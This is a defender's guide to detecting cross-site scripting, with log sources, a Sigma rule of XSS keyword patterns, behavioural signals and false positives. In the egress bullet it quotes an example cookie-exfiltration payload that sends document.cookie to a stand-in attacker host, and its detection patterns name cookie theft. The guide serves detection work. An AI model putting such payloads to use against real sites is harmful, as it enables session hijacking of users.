# Detecting Cross-Site Scripting (XSS)

Defenders see XSS as markup and event handlers in URL parameters and stored inputs, plus —
when it fires — outbound requests to attacker infrastructure carrying cookies or tokens.

## What to log / where it shows up
- **Web/proxy logs**: reflected payloads live in the query string and Referer.
- **Application logs / stored content**: stored XSS is a `<script>`, `<img onerror=`, or `<svg onload=` sitting in a comment, profile field, or message body — content-scan the DB.
- **CSP violation reports**: `script-src` / `unsafe-inline` violations are your runtime tripwire even when the WAF misses.
- **Egress/proxy + DNS**: exfil beacons (`fetch('https://attacker/c?c='+document.cookie)`) show as a single odd outbound request from a victim's browser to a domain never seen before.

## Sigma rule
```yaml
title: Cross-Site Scripting Payload in Web Request
id: d7c3eb93-0c14-44e9-bf72-a8dd6631f097
status: experimental
description: Detects reflected/stored XSS probe and exploit patterns in HTTP request parameters.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - '<script'
            - '%3Cscript'
            - 'javascript:'
            - 'onerror='
            - 'onload='
            - 'onfocus='
            - 'alert('
            - 'prompt('
            - 'confirm('
            - 'document.cookie'
            - '<svg'
            - '<img'
    filter_browsers:
        # Normal sites rarely carry markup in GET params; stored XSS needs content scanning instead
        cs-uri-stem|endswith:
            - '.png'
            - '.jpg'
            - '.css'
    condition: selection and not filter_browsers
falsepositives:
    - Rich-text editors legitimately submitting HTML in request bodies (not visible in URI logs)
    - Marketing/redirect params containing URLs with odd query strings
level: high
tags:
    - attack.t1059.007
    - cwe.79
```

## Behavioral signals
- One client replaying the same endpoint with escalating payload variants (`alert(1)` → polyglots → filter-bypass encodings) — manual probing or a scanner.
- A stored payload appearing in a write (`POST` to comment/profile) followed within minutes by reads of the page that renders it — attacker checking detonation.
- Victim session making one unexplained request to a fresh, low-reputation domain right after loading a specific page — cookie theft in flight.

## False positives
- Forums/CMS platforms where users legitimately paste HTML — scope the rule to fields that are *rendered*, and lean on CSP reports for confirmation.
- API clients sending JSON with `<`/`>` in string values — prefer content-type-aware WAF rules over blanket URI matching.
